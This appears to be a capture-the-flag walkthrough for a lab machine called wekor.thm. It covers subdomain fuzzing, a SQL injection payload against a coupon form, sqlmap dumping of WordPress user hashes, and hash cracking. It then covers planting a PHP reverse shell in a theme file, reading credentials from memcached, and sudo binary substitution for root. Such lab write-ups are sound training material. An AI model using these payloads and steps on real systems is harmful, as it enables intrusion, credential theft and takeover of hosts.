sudo nmap -sV -sC -Pn 10.17.70.209

echo "10.17.70.209 wekor.thm" | sudo tee -a /etc/hosts

`Check http://wekor.thm/robots.txt file`

User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting


Check all urls and found hint into this http://wekor.thm/comingreallysoon

http://wekor.thm/it-next/

Now find Subdomains

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.wekor.thm" -u http://wekor.thm -fs 23 -mc 200 -t 60

Found a subdomain http://site.wekor.thm/

echo "10.17.70.209 site.wekor.thm" | sudo tee -a /etc/hosts

Let's FUZZ this subdomain

ffuf -w /usr/share/wordlists/fuzz/fuzz.txt -u http://site.wekor.thm/FUZZ -fs 23 -t 60 -mc 200,301,403

I got a dir that is wordpress site http://site.wekor.thm/wordpress/

wpscan --url http://site.wekor.thm/wordpress/ -e ap,u

Nothing is there.

After many tring I found a sql error on coupon input in this page http://wekor.thm/it-next/it_cart.php

sqli payload ' or 1 = 1 -- -

Now hit the coupon's input with sql payload and intercept it with burpsuite. After that Copy full coupon input code like below and scan with sqlmap tool

"coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon"

sudo sqlmap -u "http://wekor.thm/it-next/it_cart.php" --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --schema --batch --threads=3

sudo sqlmap -u "http://wekor.thm/it-next/it_cart.php" --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump --batch --threads=3

I got username and password hash

Find out hash type

hashid password_hash

It's (MD5). Save hash into any `.txt` file and run below hashcat command using rockyou wordlist

hashcat -a 0 -m 400 pass.txt /usr/share/wordlists/rockyou.txt

john hash cracking command
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt

Cracked password is here.

Go to wp default login page location and use above cracked credentials
http://site.wekor.thm/wordpress/wp-login.php

Now download any php revers shell. I used https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 

ip addr

Copy tun0 ip from terminal and edit downloaded php-reverse-shell file and replace IP with you've copied tun0 ip also change port as you want 2323


Go to theme editor option click `I understand`  and replace all `404.php` code with edited `php-reverse-shell` file and save it. Now hit below url on your browser.
http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php

nc -lvnp 2323

python3 -c 'import pty; pty.spawn("/bin/bash")'

ps aux | grep memca

echo "get username" | nc -vn -w 1 127.0.0.1 11211
Orka

echo "get password" | nc -vn -w 1 127.0.0.1 11211
Hope you got password

cd /home/Orka
cat user.txt
user Flag 

sudo -l

mv Desktop m

mkdir Desktop

cp /bin/sh ./Desktop/bitcoin

sudo /home/Orka/Desktop/bitcoin

whoami

cd ../../

cd root

cat root.txt

root Flag 
